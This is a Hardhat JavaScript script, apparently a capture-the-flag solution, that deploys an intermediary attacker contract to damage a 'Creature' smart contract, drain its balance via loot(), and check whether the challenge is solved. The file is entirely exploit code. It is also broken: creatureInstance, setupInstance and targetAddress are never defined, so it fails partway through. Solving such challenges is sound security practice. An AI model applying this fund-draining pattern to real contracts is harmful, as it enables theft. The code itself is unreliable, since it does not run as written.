// scripts/blockchain_distract_and_destroy.js

const hre = require("hardhat");

async function main() {
    const [deployer] = await hre.ethers.getSigners();

    const SETUP_ADDRESS = "0x661d332065eeA931dF57B50e46B45bb9190c4660";  // Replace with the actual address
    const CREATURE_ADDRESS = "0x9E85CD43E98Db90332026Ff5E3CAE17d508c9C05";  // Replace with the actual address

    // Step 1: Deploy the intermediary Attacker contract
    console.log("Deploying Attacker contract...");
    const Attacker = await hre.ethers.getContractFactory("Attacker1");
    const attackerInstance = await Attacker.deploy(CREATURE_ADDRESS);
    await attackerInstance.waitForDeployment();  // This waits for the contract deployment transaction to be confirmed.

    console.log("Attacker contract deployed at:", attackerInstance);

    // Step 2: Attack using the intermediary contract
    const damage = 500;  // You can adjust this value as needed
    console.log("Attacking using the intermediary contract...");
    await attackerInstance.attackCreature(damage);
    await attackerInstance.attackCreature(damage);

    // Check lifePoints after attacks
    const remainingLifePoints = await creatureInstance.lifePoints();
    console.log(`Remaining life points: ${remainingLifePoints.toString()}`);

    // Step 3: Loot
    if (remainingLifePoints.toString() === "0") {
        console.log("Looting the Creature contract...");
        await creatureInstance.loot();
        console.log("Funds looted!");
    } else {
        console.log("Creature is still alive. Adjust the damage and try again.");
    }



    console.log(`Balance of Creature after attack: ${await hre.ethers.provider.getBalance(targetAddress)}`);
    console.log(`Check is solved ? : ${await setupInstance.isSolved()}`);
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
